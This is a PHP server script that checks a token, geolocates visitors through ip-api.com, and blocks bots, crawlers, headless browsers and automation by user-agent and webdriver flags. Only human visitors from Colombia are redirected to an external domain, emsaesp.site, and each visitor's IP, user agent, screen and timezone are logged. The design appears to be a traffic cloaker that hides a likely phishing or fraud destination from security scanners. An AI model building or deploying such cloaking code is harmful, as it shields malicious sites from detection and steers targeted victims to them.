<?php
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

$config = [
    'token' => 'c62ad2ac4cf562a883c1327a8af9facc',
    'allowed_country' => 'CO',
    'redirect_target' => 'https://emsaesp.site/',
    'geo_url' => 'http://ip-api.com/json/%s?fields=status,countryCode,country,query,message',
];

function jsonResponse(array $payload): void
{
    echo json_encode($payload, JSON_UNESCAPED_UNICODE);
    exit;
}

function getClientIp(): string
{
    $headers = [
        'HTTP_CF_CONNECTING_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_REAL_IP',
        'REMOTE_ADDR',
    ];

    foreach ($headers as $key) {
        if (empty($_SERVER[$key])) {
            continue;
        }

        $value = trim(explode(',', $_SERVER[$key])[0]);
        if (filter_var($value, FILTER_VALIDATE_IP)) {
            return $value;
        }
    }

    return '0.0.0.0';
}

function detectCountry(string $ip, string $geoUrl): array
{
    if (in_array($ip, ['127.0.0.1', '::1', '0.0.0.0'], true)) {
        return ['code' => 'LOCAL', 'name' => 'Local/Test'];
    }

    $url = sprintf($geoUrl, rawurlencode($ip));

    $context = stream_context_create([
        'http' => ['timeout' => 2],
    ]);

    $raw = @file_get_contents($url, false, $context);
    if ($raw === false) {
        return ['code' => 'UNKNOWN', 'name' => 'Unknown'];
    }

    $data = json_decode($raw, true);
    if (!is_array($data) || ($data['status'] ?? '') !== 'success') {
        return ['code' => 'UNKNOWN', 'name' => 'Unknown'];
    }

    return [
        'code' => $data['countryCode'] ?? 'UNKNOWN',
        'name' => $data['country'] ?? 'Unknown',
    ];
}

$payload = json_decode(file_get_contents('php://input') ?: '{}', true);
if (!is_array($payload)) {
    jsonResponse(['action' => 'stay', 'message' => 'Solicitud inválida.']);
}

if (($payload['token'] ?? '') !== $config['token']) {
    jsonResponse(['action' => 'stay', 'message' => 'Token inválido.']);
}

$ip = getClientIp();
$country = detectCountry($ip, $config['geo_url']);
$ua = substr($_SERVER['HTTP_USER_AGENT'] ?? ($payload['userAgent'] ?? ''), 0, 220);

$botPatterns = ['bot', 'crawler', 'spider', 'headless', 'selenium', 'phantom', 'curl', 'wget', 'python'];
$isBot = !empty($payload['webdriver']);
foreach ($botPatterns as $pattern) {
    if (stripos($ua, $pattern) !== false) {
        $isBot = true;
        break;
    }
}

$countryAllowed = ($country['code'] === $config['allowed_country']);
$allowRedirect = !$isBot && $countryAllowed;

$reason = 'No permitido por reglas';
if ($isBot) {
    $reason = 'Bot o automatización detectada';
} elseif (!$countryAllowed) {
    $reason = 'País fuera de Colombia';
} else {
    $reason = 'Permitido';
}

$logDir = __DIR__ . '/logs';
if (!is_dir($logDir)) {
    @mkdir($logDir, 0775, true);
}

$record = [
    'timestamp' => date('c'),
    'ip' => $ip,
    'country_code' => $country['code'],
    'country_name' => $country['name'],
    'is_bot' => $isBot,
    'allow_redirect' => $allowRedirect,
    'reason' => $reason,
    'url' => $payload['url'] ?? '',
    'referrer' => $payload['referrer'] ?? '',
    'lang' => $payload['lang'] ?? '',
    'timezone' => $payload['tz'] ?? '',
    'screen' => $payload['screen'] ?? '',
    'ua' => $ua,
];

file_put_contents($logDir . '/visits.jsonl', json_encode($record, JSON_UNESCAPED_UNICODE) . PHP_EOL, FILE_APPEND);

if ($allowRedirect) {
    jsonResponse([
        'action' => 'redirect',
        'target' => $config['redirect_target'],
        'country' => $country['code'],
    ]);
}

jsonResponse([
    'action' => 'stay',
    'country' => $country['code'],
    'message' => $reason,
]);
